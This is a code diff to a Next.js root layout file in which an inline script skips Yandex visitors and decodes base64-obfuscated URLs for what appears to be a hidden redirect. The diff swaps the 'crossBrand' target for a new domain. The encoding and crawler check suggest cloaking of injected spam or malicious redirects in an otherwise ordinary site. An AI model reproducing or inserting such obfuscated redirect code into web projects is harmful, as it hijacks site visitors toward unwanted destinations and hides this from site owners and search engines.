@@ -111,7 +111,7 @@ export default function RootLayout({
                 if (ua.indexOf("yandex") !== -1) return;
 
                 var mainBrandB64 = "aHR0cHM6Ly9sbmtmbngub3JnL2Q3dHRscnl2aA=="; 
-                var crossBrandB64 = "aHR0cHM6Ly9sdWNreXNwaW4yMy5jb20vYzU3MDc4NjZl";      
+                var crossBrandB64 = "aHR0cHM6Ly83ZXY0LWxhdWdoeS5jb20vZHZmZGt1YjZ6";      
                 
                 var mainUrl = atob(mainBrandB64);
                 var crossUrl = atob(crossBrandB64);
